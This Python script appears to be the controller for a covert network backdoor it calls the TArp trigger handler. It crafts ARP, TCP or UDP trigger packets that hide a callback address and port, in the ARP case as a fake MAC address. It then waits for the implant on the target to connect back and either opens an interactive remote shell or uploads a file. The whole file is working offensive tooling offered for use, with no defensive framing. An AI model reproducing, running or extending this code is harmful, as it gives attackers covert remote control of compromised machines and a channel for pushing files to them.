#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import struct
import netaddr
import sys
import select
import argparse
import netifaces
from scapy.all import *

OKBLUE       = '\033[94m'
RED          = '\033[31m'
RED_BLINK    = '\033[31;5m'
RED_BOLD     = '\033[31;1m'
RESET        = '\033[0m'
YELLOW       = '\033[33m'
YELLOW_BLINK = '\033[33;5m'
OVERWRITE    = '\033[1000D'

# Acquire local address (hopefully not picking the loopback address)
local_addresses = []
for interface in netifaces.interfaces():
    local_addresses.append(netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr'])

local_ip = local_addresses[-1]

# Create a display class to print color coded alerts and messages
class Display(object):

    def alert(self,message):
        print "[%s!%s] %s" % (YELLOW_BLINK,RESET,message)

    def info(self,message):
        print "[%s*%s] %s" % (RED,RESET,message)


# define type parsers for argument input
#verifies provided IP is valid
def parse_ip(ipaddr):
    if not netaddr.valid_ipv4(ipaddr):
        msg = "Not a valid IP address (%s)" % ipaddr
        raise argparse.ArgumentTypeError(msg)
    return ipaddr

#verifies file can be opened for reading
def open_file(in_file):
    try:
        f = open(in_file,'rb')
    except IOError as err:
        print in_file
        print err.strerror
        sys.exit(2)
    return f

# Build argument parser and return args object
def get_args():

    banner = "" + RED +\
    u"                    ██╗ ██████╗ ███████╗ ██╗\n" +\
    u"                    ██║██╔════╝ ██╔════╝ ██║\n" +\
    u"                    ██║██║  ███╗███████╗ ██║\n" +\
    u"               ██   ██║██║   ██║╚════██║ ██║\n" +\
    u"               ╚█████╔╝╚██████╔╝███████║ ██║\n" +\
    u"                ╚════╝  ╚═════╝ ╚══════╝ ╚═╝\n\n" + RESET

    # Define parser arguments
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
            description = banner + "The TArp trigger handler." +\
            " Builds the ARP, TCP, or UDP trigger packet and \nhandles the specified callback.")

    parser.add_argument("-t", default="tcp", metavar="", dest="t_type",
            choices=["arp","tcp","udp"], type=str.lower,
            help="Specify the trigger type. (default: tcp)")
    
    parser.add_argument("-c", default=local_ip ,type=parse_ip, metavar="", dest="c_addr",
            help="Callback IP Address. (default: %s)" % local_ip)
    
    parser.add_argument("-p", default=8055, type=int, choices=range(1,65535),
            metavar='', dest="c_port",
            help="Callback Port number. (default: 8055)")

    parser.add_argument("-s", default=local_ip,
            type=parse_ip, metavar="", dest="source",
            help="Source Address for trigger packet. (default: %s)" % local_ip)
    
    parser.add_argument("-U", default=False, metavar="FILE", dest="upload",
            type=open_file,
            help="Upload file. Without this flag implies shell callback.")
    
    parser.add_argument("-f", action="store_true", dest="force",
            help="Force listener on all interfaces.")
    
    parser.add_argument("target", type=parse_ip, metavar="TARGET",
            help="Target IP Address.")
    
    return parser.parse_args()

def build_trigger(args):
    '''
    Displays the created trigger that will be sent to the target
    for verification of details prior to firing.
    Receives packet(p) and the full args object.
    '''

    ip_layer = IP(dst=args.target,src=args.source)
    c_addr = netaddr.IPAddress(args.c_addr)

    if args.t_type != "arp":

        if args.t_type == "tcp":
            transport_layer = TCP(dport=22,sport=45555)
        
        elif args.t_type == "udp":
            transport_layer = UDP(dport=123,sport=45555)

        callback = Raw(load=struct.pack("!H",args.c_port))/Raw(load=c_addr.packed)
        trigger = ip_layer/transport_layer/callback

        print "\nPreparing to send a trigger packet with the folowing details...\n"
        print "========IP Header======"
        print "Source: %s" % ip_layer.src
        print "Dest  : %s" % ip_layer.dst
        print "=======%s Header======" % transport_layer.name.upper()
        print "SPort : %s" % transport_layer.sport
        print "DPort : %s" % transport_layer.dport
        print "=====Callback Data====="
        print "IP    : %s" % c_addr
        print "Port  : %s" % args.c_port

        if args.upload:
            print "======File Upload======"
            print args.upload.name
        else:
            print "====Shell Callback====="
        print "======================="

    else:
        
        # build hwsrc field to hide the callback address and port as a pseudo mac address
        callback = []
        port_bytes = struct.pack("!H",args.c_port)
        addr_bytes = c_addr.packed

        for x in range(len(port_bytes)):
            callback.append(binascii.hexlify(port_bytes[x]))
        for x in range(len(addr_bytes)):
            callback.append(binascii.hexlify(addr_bytes[x]))

        trigger = ARP(pdst = args.target, hwdst = "ff:fe:ff:ff:fe:ff", hwsrc = ":".join(callback))

        print "\nPreparing to send a trigger packet with the folowing details...\n"
        print "========ARP Header========"
        print "HwDst  : %s" % trigger.hwdst
        print "HwSrc  : %s" % trigger.hwsrc
        print "======Callback Data======="
        print "IP    : %s" % c_addr
        print "Port  : %s" % args.c_port

        if args.upload:
            print "=======File Upload========"
        else:
            print "======Shell Callback======="
        print "=========================="
        
    return trigger

def handle_shell(callback, c_info):
    sys.stdout.write("%s%s>%s" % (RED_BOLD,c_info[0],RESET))
    sys.stdout.flush()
    while True:

        # ulitizes select to determine which stream has data to be received from
        sock_list = [sys.stdin,callback]
        read_sockets, write_socket, error_socket = select(sock_list,[],[])

        for sock in read_sockets:
            if sock == callback:
                data = b""
                buffer = 1024
                while True:
                    message = sock.recv(buffer)
                    data += message
                    if message[-1] == "\n":
                        break
                sys.stdout.write("\n" + data + "%s%s>%s" % (RED_BOLD,c_info[0],RESET))
                sys.stdout.flush()
            else:
                message = sys.stdin.readline().strip()
                if message.strip() == "exit":
                    break
                else:
                    callback.send(message + '\n')
                    sys.stdout.write("%s%s>%s" % (RED_BOLD,c_info[0],RESET))
                    sys.stdout.flush()

        if message == "exit":
            callback.send(message + '\n')
            callback.shutdown(socket.SHUT_RDWR)
            callback.close()
            break

def handle_upload(sock, fd):
   
    chunk = fd.read(1024)
    total = 0
    while(chunk):
        sock.send(chunk)
        total += len(chunk)
        print "Sent %d bytes" % total
        chunk = fd.read(1024)
    fd.close()
    sock.close()


def main():

    # Parse commandline arguments
    args = get_args()
    display = Display()

    trigger = build_trigger(args)
    
    while True:
        resp = raw_input("\nReady to send it? ").lower()
        if resp == "yes" or resp == "y":
            break
        elif resp == "no" or resp == "n":
            print "Not gonna send it..."
            sys.exit()

    if args.c_addr in local_addresses or args.force:

        display.info("Preparing listener.")

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(30)
        try:
            if args.force:
                s.bind(("0.0.0.0",args.c_port))
                s.listen(1)
            else:
                s.bind((args.c_addr,args.c_port))
                s.listen(1)
        except socket.error as err:
            display.alert(err.strerror)
            sys.exit(1)

        display.info("Ready to receive callback. Sending trigger!")
        send(trigger)
        
        display.info("Waiting for callback....")
        try:
            callback, c_info = s.accept()
            display.alert("Received connection from %s" % c_info[0])
        except socket.timeout as err:
            display.alert(err)
            sys.exit(1)

        if not args.upload:
            handle_shell(callback, c_info)
        else:
            display.info("Uploading file..")
            handle_upload(callback, args.upload)
            display.info("File upload complete.")

    else:

        display.alert("Callback address not on this box. Ensure a listener is ready.")
        raw_input("Press [ENTER] to continue....")
        send(trigger)


if __name__ == "__main__":
    main()
